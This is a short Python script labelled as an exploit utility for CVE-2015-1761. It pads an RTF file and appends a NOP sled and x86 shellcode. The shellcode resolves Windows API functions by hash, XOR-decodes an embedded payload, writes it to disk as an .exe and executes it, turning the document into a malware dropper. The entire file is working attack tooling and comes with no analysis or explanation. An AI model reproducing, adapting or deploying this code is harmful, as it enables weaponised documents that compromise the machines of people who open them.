#cve-2015-1761 exp util

import struct
import os
import random

rtf = open('new.rtf','rb+')

buff = rtf.read()

while len(buff)%0x10000:
	buff += chr(random.randint(0,0xff))

buff += '\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFF\xFF\xFF\xFF\x90\x90\x90\x90'

buff += "\x8b\xe8\x8d\xbd\x00\xf0\xff\xff\x8f\x47\x48\x8f\x47\x54\x8f\x47\x50\x8f\x47\x4c\x8f\x47\x44"\
    "\x55\x8B\xEC\x81\xEC\xD4\x00\x00\x00\x53\x56\x57\xC7\x45\xC0\x00"\
    "\x00\x00\x00\xC7\x45\xB4\x00\x00\x00\x00\xC7\x45\xB8\x00\x00\x00"\
    "\x00\xC7\x45\xEC\x00\x00\x00\x00\xC7\x45\xF8\x00\x00\x00\x00\xC7"\
    "\x45\xF0\x00\x00\x00\x00\xC7\x45\xC4\xBE\x91\x0F\x11\xC7\x45\xC8"\
    "\x42\xBF\xBA\x8D\xC7\x45\xCC\x7C\x8C\x49\x84\xC7\x45\xD0\xD6\x5C"\
    "\xD0\x93\xC7\x45\xD4\xB8\xD8\xA0\xEF\xC7\x45\xD8\x2B\x33\xB2\x64"\
    "\xC7\x45\xDC\xBD\x40\x0A\xCA\xC7\x45\xE0\xAC\x00\x01\xCB\x8B\x47"\
    "\x48\x89\x45\xF8\x8B\x45\xF8\x89\x45\xC0\x8B\x4D\xC0\x8B\x55\xF8"\
    "\x03\x51\x3C\x89\x55\xB4\xB8\x08\x00\x00\x00\x6B\xC0\x00\x8B\x4D"\
    "\xB4\x8D\x54\x01\x78\x89\x55\xB8\x8B\x45\xB8\x8B\x4D\xF8\x03\x08"\
    "\x89\x4D\xEC\xC7\x45\xE4\x00\x00\x00\x00\xC7\x45\xE8\x00\x00\x00"\
    "\x00\xC7\x45\xB0\x00\x00\x00\x00\xC7\x45\xF4\x00\x00\x00\x00\xC7"\
    "\x45\xFC\x00\x00\x00\x00\x8B\x55\xEC\x8B\x45\xF8\x03\x42\x20\x89"\
    "\x45\xE4\x8B\x4D\xEC\x8B\x55\xF8\x03\x51\x24\x89\x55\xE8\xC7\x45"\
    "\xF0\x00\x00\x00\x00\xEB\x1B\x8B\x45\xF0\x83\xC0\x01\x89\x45\xF0"\
    "\x8B\x4D\xE4\x83\xC1\x04\x89\x4D\xE4\x8B\x55\xE8\x83\xC2\x02\x89"\
    "\x55\xE8\x8B\x45\xEC\x8B\x4D\xF0\x3B\x48\x14\x0F\x83\xCC\x00\x00"\
    "\x00\x8B\x55\xE8\x0F\xB7\x02\x89\x45\xAC\x8B\x4D\xE4\x8B\x55\xF8"\
    "\x03\x11\x89\x55\xB0\x8B\x45\xEC\x8B\x4D\xF8\x03\x48\x1C\x8B\x55"\
    "\xAC\x8B\x45\xF8\x03\x04\x91\x89\x45\xF4\x33\xDB\x8B\x45\xB0\x0F"\
    "\xBE\x10\x3A\xD6\x74\x08\xC1\xCB\x07\x03\xDA\x40\xEB\xF1\x89\x5D"\
    "\xFC\x83\x7D\xFC\x00\x75\x05\xE9\x81\x00\x00\x00\x8B\x4D\xFC\x81"\
    "\xF1\xEF\xBE\xAD\x10\x89\x4D\xFC\x8B\x55\xC4\x3B\x55\xFC\x75\x06"\
    "\x8B\x45\xF4\x89\x45\xC4\x8B\x4D\xC8\x3B\x4D\xFC\x75\x06\x8B\x55"\
    "\xF4\x89\x55\xC8\x8B\x45\xCC\x3B\x45\xFC\x75\x06\x8B\x4D\xF4\x89"\
    "\x4D\xCC\x8B\x55\xD0\x3B\x55\xFC\x75\x06\x8B\x45\xF4\x89\x45\xD0"\
    "\x8B\x4D\xD4\x3B\x4D\xFC\x75\x06\x8B\x55\xF4\x89\x55\xD4\x8B\x45"\
    "\xD8\x3B\x45\xFC\x75\x06\x8B\x4D\xF4\x89\x4D\xD8\x8B\x55\xDC\x3B"\
    "\x55\xFC\x75\x06\x8B\x45\xF4\x89\x45\xDC\x8B\x4D\xE0\x3B\x4D\xFC"\
    "\x75\x06\x8B\x55\xF4\x89\x55\xE0\xE9\x0A\xFF\xFF\xFF\x8D\x85\x2C"\
    "\xFF\xFF\xFF\x50\x6A\x60\xFF\x55\xD0\x8D\x8D\x2C\xFF\xFF\xFF\x89"\
    "\x4D\xF0\x8B\x5D\xF0\x33\xC0\x40\x80\x3C\x03\x00\x75\xF9\xC7\x04"\
    "\x03\x41\x41\x41\x41\xC7\x44\x03\x04\x2E\x65\x78\x65\x6A\x00\x68"\
    "\x80\x00\x00\x00\x6A\x02\x6A\x00\x6A\x00\x68\x00\x00\x00\x40\x8D"\
    "\x95\x2C\xFF\xFF\xFF\x52\xFF\x55\xCC\x89\x45\xBC\x8B\x57\x54\x33"\
    "\xC9\x83\xC1\x04\x81\x3C\x0A\xBA\xBA\xBA\xBA\x75\xF4\x83\xC2\x04"\
    "\x66\x81\x3C\x0A\xBA\xBA\x75\xE9\x8D\x54\x0A\x02\x33\xDB\x8D\x8F"\
    "\x00\x30\x00\x00\x8B\x04\x1A\x83\xF8\x00\x74\x05\x35\xBE\xBA\xFE"\
    "\xCA\x89\x04\x19\x83\xC3\x04\x81\x3C\x1A\xBB\xBB\xBB\xBB\x75\xE4"\
    "\x8D\x34\x1A\x8D\x0C\x24\x8D\x87\x00\x30\x00\x00\x6A\x00\x51\x53"\
    "\x50\xFF\x75\xBC\xFF\x55\xD8\x8B\x45\xBC\x50\xFF\x55\xD4\xEB\x0C"\
    "\x6A\x01\xFF\x75\xF0\xFF\x74\x24\x08\xFF\x65\xC4\xE8\xEF\xFF\xFF"\
    "\xFF\x8B\xD6\x33\xC9\x42\x80\x3C\x0A\xBB\x74\xF9\x8D\x8F\x00\x30"\
    "\x10\x00\x33\xDB\x8B\x04\x1A\x83\xF8\x00\x74\x05\x35\x0D\xF0\xAD"\
    "\xBA\x89\x04\x19\x83\xC3\x04\x81\x3C\x1A\xBC\xBC\xBC\xBC\x75\xE4"\
    "\xFF\x77\x54\xFF\x55\xDC\x8D\xB7\x00\x30\x10\x00\x03\xF3\x8B\x4F"\
    "\x4C\x2B\xCB\xC1\xE9\x02\xC7\x06\x00\x00\x00\x00\x83\xC6\x04\xE2"\
    "\xF5\x6A\x00\x6A\x00\x6A\x00\xFF\x77\x50\xFF\x55\xE0\x6A\x00\x8D"\
    "\x0C\x24\x8D\x87\x00\x30\x10\x00\x6A\x00\x51\xFF\x77\x4C\x50\xFF"\
    "\x77\x50\xFF\x55\xD8\xFF\x77\x50\xFF\x55\xD4\x33\xD2\x4A\xBB\x28"\
    "\xA4\x38\x7C\x8B\x75\xC8\x89\x33\x64\xA1\x30\x00\x00\x00\x8B\xB8"\
    "\x0C\x02\x00\x00\x8B\xCA\xB8\x9E\x21\x34\x7C\xFC\xF2\xAF\xF7\xD1"\
    "\xD1\xE9\xC7\x43\x04\x15\x8D\x34\x7C\x89\x4B\x08\x89\x53\x0C\x89"\
    "\x53\x10\xBB\xB0\x02\x39\x7C\x8B\x3B\x8D\x07\x87\xCA\xFD\xF2\xAF"\
    "\x8D\x6F\x04\xB8\x78\x22\x34\x7C\xF2\xAF\x8D\x67\x04\x89\x54\x24"\
    "\x04\x33\xC0\xFC\xFF\xE6\x33\xC0\x5F\x5E\x5B\x8B\xE5\x5D"
    
while len(buff)%0x10000:
	buff += chr(random.randint(0x11,0xff))

rtf.seek(0)
rtf.write(buff)
rtf.close()
